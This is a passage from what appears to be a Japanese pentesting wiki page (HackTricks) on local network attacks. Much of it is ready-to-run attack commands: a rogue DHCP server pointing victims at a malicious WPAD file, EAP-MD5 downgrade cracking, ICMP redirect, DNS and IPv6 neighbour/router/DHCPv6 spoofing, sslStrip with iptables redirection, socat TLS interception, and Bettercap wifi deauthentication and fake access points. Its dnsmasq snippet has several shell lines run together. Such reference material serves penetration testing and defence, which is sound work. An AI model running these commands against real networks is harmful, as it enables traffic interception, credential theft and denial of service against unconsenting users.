これらのオプションを正しく使用することで、ローグDHCPサーバーを効果的に設定してネットワークトラフィックを傍受することができます。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP攻撃**

以下は、802.1X実装に対して使用できる攻撃戦術のいくつかです：

* EAPを介したアクティブな総当たりパスワード解読
* EAPコンテンツを不正に攻撃するRADIUSサーバ _(exploits)_
* EAPメッセージのキャプチャとオフラインパスワードクラッキング（EAP-MD5およびPEAP）
* EAP-MD5認証を強制してTLS証明書の検証をバイパスする
* ハブまたは類似のものを使用して認証後に悪意のあるネットワークトラフィックを注入

攻撃者が被害者と認証サーバーの間にいる場合、必要に応じて認証プロトコルをEAP-MD5に劣化させ、認証試行をキャプチャできます。その後、以下を使用して総当たり攻撃を行うことができます：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻撃 <a href="#id-6196" id="id-6196"></a>

**FHRP**（First Hop Redundancy Protocol）は、**ホット冗長ルーティングシステムを作成**するために設計されたネットワークプロトコルのクラスです。FHRPを使用すると、物理ルーターを1つの論理デバイスに組み合わせることができ、信頼性を向上させ負荷を分散するのに役立ちます。

**Cisco Systemsのエンジニアは、GLBPとHSRPの2つのFHRPプロトコルを開発しました。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

ルーティング情報プロトコル（RIP）には3つのバージョンが存在します：RIP、RIPv2、RIPng。RIPとRIPv2はUDPを使用してポート520経由でピアにデータグラムを送信しますが、RIPngはIPv6マルチキャストを介してUDPポート521にブロードキャストされます。RIPv2ではMD5認証がサポートされています。一方、RIPngにはネイティブ認証が組み込まれておらず、代わりにIPv6内のIPsec AHおよびESPヘッダーに依存しています。

* **RIPとRIPv2:** 通信はポート520上のUDPデータグラムを介して行われます。
* **RIPng:** IPv6マルチキャストを介してUDPポート521を利用してデータグラムをブロードキャストします。

RIPv2はMD5認証をサポートしていますが、RIPngにはネイティブ認証が含まれず、IPv6内のIPsec AHおよびESPヘッダーに依存しています。

### EIGRP 攻撃

**EIGRP（Enhanced Interior Gateway Routing Protocol）**は動的ルーティングプロトコルです。**認証がない**場合やパッシブインターフェイスの構成がない場合、**侵入者**はEIGRPルーティングに干渉し、**ルーティングテーブルの改ざん**を引き起こす可能性があります。さらに、EIGRPネットワーク（つまり、自律システム）**はフラットで、ゾーンに分割されていません**。**攻撃者がルートを注入**すると、このルートが自律EIGRPシステム全体に**広がる**可能性があります。

EIGRPシステムを攻撃するには、合法的なEIGRPルーターとの**隣接関係を確立**する必要があります。これにより、基本的な偵察からさまざまなインジェクションまでさまざまな可能性が開かれます。

[**FRRouting**](https://frrouting.org/)を使用すると、**BGP、OSPF、EIGRP、RIPなどのプロトコルをサポートする仮想ルーター**を実装できます。攻撃者のシステムに展開するだけで、ルーティングドメイン内の合法的なルーターを装うことができます。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/)は、EIGRP（Enhanced Interior Gateway Routing Protocol）ブロードキャストを傍受する機能を持っています。また、ルーティング構成を変更するために使用できるパケットのインジェクションも可能です。

### OSPF

Open Shortest Path First（OSPF）プロトコルでは、**MD5認証が一般的に使用され、ルーター間の安全な通信を確保**します。ただし、このセキュリティ対策はLokiやJohn the Ripperなどのツールを使用して妨害される可能性があります。これらのツールはMD5ハッシュをキャプチャしてクラックし、認証キーを公開することができます。このキーを取得すると、新しいルーティング情報を導入するために使用できます。ルートパラメータを構成し、侵害されたキーを確立するには、それぞれ _Injection_ および _Connection_ タブが使用されます。

* **MD5ハッシュのキャプチャとクラック:** LokiやJohn the Ripperなどのツールが使用されます。
* **ルートパラメータの構成:** _Injection_ タブを介して行われます。
* **侵害されたキーの設定:** キーは _Connection_ タブの下で構成されます。

### その他の一般的なツールとソース

* [**Above**](https://github.com/c4s73r/Above): ネットワークトラフィックをスキャンして脆弱性を見つけるツール
* ネットワーク攻撃に関する**詳細情報**は[**こちら**](https://github.com/Sab0tag3d/MITM-cheatsheet)で見つけることができます。

## **スプーフィング**

攻撃者は、偽のDHCP応答を送信して、ネットワークの新しいメンバーのすべてのネットワークパラメータ（GW、IP、DNS）を構成します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPスプーフィング

[前のセクション](./#arp-spoofing)をチェックしてください。

### ICMPリダイレクト

ICMPリダイレクトは、ICMPパケットタイプ1コード5を送信することで、攻撃者がIPに到達する最良の方法であることを示すものです。その後、被害者がIPに連絡しようとすると、パケットは攻撃者を介して送信されます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSスプーフィング

攻撃者は、被害者が要求するドメインのいくつか（またはすべて）を解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqを使用して独自のDNSを設定する**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

システムやネットワークへの複数のルートがしばしば存在します。ローカルネットワーク内のMACアドレスのリストを作成した後、_gateway-finder.py_ を使用してIPv4フォワーディングをサポートするホストを特定します。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR、NBT-NS、およびmDNSのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS検索が失敗した場合、Microsoftシステムは**リンクローカルマルチキャスト名解決（LLMNR）**と**NetBIOS名前サービス（NBT-NS）**に依存します。同様に、**Apple Bonjour**および**Linuxゼロ構成**実装は、ネットワーク内のシステムを発見するために**マルチキャストDNS（mDNS）**を利用します。これらのプロトコルは認証されていないため、UDP上で動作し、メッセージをブロードキャストするため、攻撃者によって悪意のあるサービスにユーザーをリダイレクトするために悪用される可能性があります。

Responderを使用して、ホストが検索するサービスを偽の応答を送信することで、サービスを偽装することができます。\
[Responderを使用したサービスの偽装方法](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)に関する詳細情報はこちらを参照してください。

### [WPADのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ブラウザは一般的に**Web Proxy Auto-Discovery（WPAD）プロトコルを使用してプロキシ設定を自動的に取得**します。これには、特定のURL（たとえば "http://wpad.example.org/wpad.dat"）を介してサーバーから構成詳細を取得することが含まれます。クライアントによるこのサーバーの発見は、次のメカニズムを介して行われる可能性があります：

* **DHCP**を介して、特別なコード252エントリを利用して発見を促進します。
* **DNS**により、ローカルドメイン内の _wpad_ というホスト名を検索します。
* **Microsoft LLMNRおよびNBT-NS**を介して、DNS検索が成功しない場合に使用されるフォールバックメカニズム。

ツールResponderは、**悪意のあるWPADサーバー**としてこのプロトコルを利用します。それはDHCP、DNS、LLMNR、およびNBT-NSを使用してクライアントを誤誘導します。Responderを使用してサービスを偽装する方法について詳しく知りたい場合は、[こちらをチェック](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)してください。

### [SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内で異なるサービスを提供して、**ユーザーをだます**ことができます。**この攻撃に関する詳細情報は**[**SSDPおよびUPnPデバイスのスプーフィング**](spoofing-ssdp-and-upnp-devices.md)**で確認してください。**

### IPv6隣接スプーフィング

この攻撃はARPスプーフィングに非常に似ていますが、IPv6の世界で行われます。被害者に、GWのIPv6が攻撃者のMACアドレスであると思わせることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6ルーター広告のスプーフィング/フラッディング

一部のOSは、ネットワーク内で送信されたRAパケットからデフォルトでゲートウェイを構成します。攻撃者をIPv6ルーターとして宣言するためには、次のコマンドを使用できます：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPスプーフィング

デフォルトでは、一部のOSはネットワーク内のDHCPv6パケットを読み取ってDNSを構成しようとします。そのため、攻撃者は自分自身をDNSとして構成するためにDHCPv6パケットを送信することができます。DHCPはまた、被害者にIPv6を提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (フェイクページとJSコードの挿入)

## インターネット攻撃

### sslStrip

この攻撃が行うことは、**ユーザー**が**HTTP**ページに**アクセス**しようとする場合、そのページが**HTTPS**バージョンに**リダイレクト**される場合に、**sslStrip**が**クライアントと**の間で**HTTP接続を維持**し、**サーバーと**の間で**HTTPS接続を確立**することです。これにより、**sslStrip**は接続を**平文**で**嗅ぎ取る**ことができます。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
詳細は[こちら](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### HSTSをバイパスするためのsslStrip+およびdns2proxy

**sslStrip+とdns2proxy**と**sslStrip**の**違い**は、例えば_**www.facebook.com**_を_**wwww.facebook.com**_に**リダイレクト**し、このドメインのアドレスを攻撃者のIPに設定する点です。これにより、**クライアント**は_**wwww.facebook.com**_（攻撃者）に**接続**しますが、裏では**sslstrip+**が**https**を介して**www.facebook.com**と**実際の接続**を**維持**します。

この技術の**目的**は、_**wwww**.facebook.com_がブラウザの**キャッシュ**に保存されないため、ブラウザが**HTTP**で**facebook認証**を実行するように騙すことです。\
この攻撃を行うためには、被害者が最初に[http://www.faceook.com](http://www.faceook.com)にアクセスしようとする必要があり、httpsではないことに注意してください。これは、httpページ内のリンクを変更することで行うことができます。

詳細は[こちら](https://www.bettercap.org/legacy/#hsts-bypass)、[こちら](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)、および[こちら](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStripまたはsslStrip+はもはや機能しません。これは、ブラウザに事前保存されたHSTSルールがあるためです。したがって、ユーザーが「重要な」ドメインに初めてアクセスする場合でも、HTTPSでアクセスします。また、事前保存されたルールや他の生成されたルールには、**`includeSubdomains`**フラグを使用できることに注意してください。そのため、以前の_**wwww.facebook.com**_の例は機能しなくなります。_**facebook.com**_は`includeSubdomains`を使用してHSTSを使用しているためです。

TODO: easy-creds、evilgrade、metasploit、factory

## ポートでのTCPリッスン
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートでのリッスン

#### キーと自己署名証明書の生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用して盗聴
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してホストにリダイレクトする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
クライアントがCAが有効であるかどうかをチェックする場合、**CAによって署名された他のホスト名の証明書を提供**することがあります。\
もう1つの興味深いテストは、リクエストされたホスト名の**セルフ署名証明書を提供**することです。

他にテストすることは、有効なCAでない有効な証明書で証明書に署名しようとすることです。また、有効な公開鍵を使用して証明書に署名し、ディフィー・ヘルマンなどのアルゴリズムを使用するように強制し、クライアントが実際の秘密鍵で何も復号化する必要がないものを要求するときに、クライアントがこれをチェックしないことを期待して、実際の秘密鍵のプローブ（ハッシュなど）のリクエスト時に偽のプローブを送信することです。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

UDPパケットが要求されたポートを持たないデバイスに送信されると、ICMP（ポート到達不能）が送信されることに注意してください。

### **ARP discover**

ARPパケットはネットワーク内で使用されているIPアドレスを発見するために使用されます。PCは各可能なIPアドレスに対してリクエストを送信し、使用されているものだけが応答します。

### **mDNS（マルチキャストDNS）**

Bettercapは、**\_services\_.dns-sd.\_udp.local**を要求するMDNSリクエスト（Xミリ秒ごと）を送信します。このパケットを見たマシンは通常このリクエストに応答します。その後、"services"に応答するマシンのみを検索します。

**ツール**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios Name Server）**

Bettercapは、名前"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"を要求するためにポート137/UDPにブロードキャストパケットを送信します。

### **SSDP（Simple Service Discovery Protocol）**

Bettercapは、すべての種類のサービスを検索するためにSSDPパケットをブロードキャストします（UDPポート1900）。

### **WSD（Web Service Discovery）**

Bettercapは、サービスを検索するためにWSDパケットをブロードキャストします（UDPポート3702）。

## 参考文献

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network（第3版）**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**で**最大$100,000**のバウンティを稼ぎましょう！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加してください！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
